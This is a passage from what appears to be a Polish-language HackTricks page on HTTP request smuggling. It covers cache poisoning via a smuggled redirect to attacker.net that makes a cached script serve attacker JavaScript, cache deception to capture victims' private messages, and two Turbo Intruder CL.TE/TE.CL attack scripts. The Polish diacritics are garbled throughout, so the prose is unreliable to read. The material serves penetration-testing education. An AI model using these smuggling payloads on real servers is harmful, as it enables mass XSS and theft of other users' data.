W tym scenariuszu 偶danie u偶ytkownika dotyczce pliku JavaScript zostaje przejte. Atakujcy mo偶e potencjalnie narazi u偶ytkownika na niebezpieczestwo, serwujc zoliwy kod JavaScript w odpowiedzi.

### Wykorzystanie 偶dania HTTP smuggling do przeprowadzenia zatrucia pamici podrcznej witryny <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

### Wykorzystanie zatrucia pamici podrcznej witryny za pomoc 偶dania HTTP smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Zatrucie pamici podrcznej witryny mo偶na przeprowadzi, jeli dowolny komponent **infrastruktury front-endowej buforuje zawarto**, zwykle w celu poprawy wydajnoci. Poprzez manipulacj odpowiedzi serwera, mo偶liwe jest **zatrucie pamici podrcznej**.

Wczeniej obserwowalimy, jak odpowiedzi serwera mog by zmieniane, aby zwraca bd 404 (patrz [Podstawowe przykady](./#basic-examples)). Podobnie, mo偶liwe jest oszukanie serwera, aby dostarcza zawarto `/index.html` w odpowiedzi na 偶danie `/static/include.js`. W rezultacie zawarto `/static/include.js` zostaje zastpiona w pamici podrcznej zawartoci `/index.html`, co uniemo偶liwia dostp do `/static/include.js` dla u偶ytkownik贸w, co potencjalnie prowadzi do ataku typu Denial of Service (DoS).

Ta technika staje si szczeg贸lnie skuteczna, jeli zostanie odkryta **podatno na przekierowanie** lub jeli wystpuje **przekierowanie na przekierowanie** na stronie. Takie podatnoci mog by wykorzystane do zastpienia zawartoci w pamici podrcznej `/static/include.js` skryptem kontrolowanym przez atakujcego, co umo偶liwia przeprowadzenie rozlegego ataku typu Cross-Site Scripting (XSS) przeciwko wszystkim klientom 偶dajcym zaktualizowanego `/static/include.js`.

Poni偶ej przedstawiono ilustracj wykorzystania **zatrucia pamici podrcznej w poczeniu z przekierowaniem na przekierowanie**. Celem jest zmiana zawartoci pamici podrcznej `/static/include.js`, aby serwowa kod JavaScript kontrolowany przez atakujcego:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Zauwa偶 wbudowane 偶danie skierowane na `/post/next?postId=3`. To 偶danie zostanie przekierowane na `/post?postId=4`, wykorzystujc warto nag贸wka **Host** do okrelenia domeny. Poprzez zmian nag贸wka **Host**, atakujcy mo偶e przekierowa 偶danie na swoj domen (**przekierowanie wewntrzne na przekierowanie zewntrzne**).

Po udanym **zatruciu gniazda**, powinno zosta zainicjowane 偶danie **GET** dla `/static/include.js`. To 偶danie zostanie zanieczyszczone przez wczeniejsze 偶danie **przekierowania wewntrznego na przekierowanie zewntrzne** i pobierze zawarto skryptu kontrolowanego przez atakujcego.

Nastpnie, ka偶de 偶danie dla `/static/include.js` bdzie serwowa zawarto zbuforowanego skryptu atakujcego, co efektywnie uruchomi szeroki atak XSS.


### U偶ywanie przemytu 偶da HTTP do przeprowadzenia oszustwa pamici podrcznej sieci web <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Jaka jest r贸偶nica midzy zatruciem pamici podrcznej sieci web a oszustwem pamici podrcznej sieci web?**
>
> * W **zatruciu pamici podrcznej sieci web**, atakujcy powoduje, 偶e aplikacja przechowuje pewn zoliw zawarto w pamici podrcznej, a ta zawarto jest serwowana z pamici podrcznej innym u偶ytkownikom aplikacji.
> * W **oszustwie pamici podrcznej sieci web**, atakujcy powoduje, 偶e aplikacja przechowuje pewn wra偶liw zawarto nale偶c do innego u偶ytkownika w pamici podrcznej, a nastpnie atakujcy odzyskuje t zawarto z pamici podrcznej.

Atakujcy tworzy przemycony 偶danie, kt贸re pobiera wra偶liw zawarto specyficzn dla u偶ytkownika. Przyjrzyj si poni偶szemu przykadowi:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Jeli ten przemycony 偶danie zatruje wpis w pamici podrcznej przeznaczony dla treci statycznych (np. `/someimage.png`), wra偶liwe dane ofiary z `/private/messages` mog by przechowywane w pamici podrcznej pod wpisem dla treci statycznych. W rezultacie, atakujcy mo偶e potencjalnie odzyska te przechowywane wra偶liwe dane.

### Uzbrojenie HTTP Request Smuggling z HTTP Response Desynchronisation

Czy znalaze jak podatno na HTTP Request Smuggling i nie wiesz, jak j wykorzysta? Spr贸buj tej innej metody eksploatacji:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Skrypty Turbo Intruder

### CL.TE

Z [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Z: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Narzdzia

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): To narzdzie jest gramatycznym HTTP Fuzzerem przydatnym do znajdowania dziwnych niezgodnoci w 偶daniach smugglingowych.

## Odwoania

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
